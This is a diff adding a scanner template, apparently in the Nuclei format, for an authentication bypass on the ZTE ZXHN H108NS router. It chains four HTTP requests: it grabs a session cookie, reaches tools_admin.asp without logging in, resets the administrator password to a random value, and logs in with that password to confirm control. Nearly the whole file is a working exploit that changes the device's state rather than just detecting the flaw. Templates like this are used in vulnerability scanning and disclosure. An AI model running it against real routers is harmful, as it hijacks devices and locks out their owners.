@@ -1,0 +1,82 @@
+id: zte-h108ns-tools_admin-permission-bypass
+info:
+  name: ZXHN H108NS Router tools_admin.asp Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The ZTE H108NS router has an identity authentication bypass vulnerability. An attacker can use this vulnerability to bypass authentication and access the router's management panel to modify the administrator password and obtain sensitive user information.
+  reference:
+    - https://fofa.info
+  tags:
+    - permission-bypass
+    - router
+
+variables:
+  random_password: '{{rand_text_alphanumeric(8)}}'
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: check-login
+    method: GET
+    path:
+      - "/cgi-bin/index.asp"
+    headers:
+      DNT: "1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Unauthorized"
+      - type: word
+        words:
+          - "/cgi-bin/index.asp"
+    extractors:
+      - type: kval
+        kval:
+          - set-cookie
+        internal: true
+
+  - id: bypass-permission
+    method: POST
+    path:
+      - "/cgi-bin/tools_admin.asp"
+    headers:
+      Cookie: "{{set-cookie}}"
+      DNT: "1"
+    body: "\n\n"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Administrator"
+          - "Confirm Password"
+
+  - id: set-new-password
+    method: POST
+    path:
+      - "/cgi-bin/tools_admin.asp"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: "{{set-cookie}}"
+    body: "adminFlag=1&CurrentAccess=0&uiViewTools_Password={{random_password}}&uiViewTools_PasswordConfirm={{random_password}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "New Password"
+
+  - id: verify-access
+    method: GET
+    path:
+      - "/cgi-bin/index.asp"
+    headers:
+      Authorization: "Basic {{base64(concat('admin:', random_password))}}"
+      Cookie: "{{set-cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/cgi-bin/status.asp"
+          - "/cgi-bin/wizardPPP_OTE.asp"
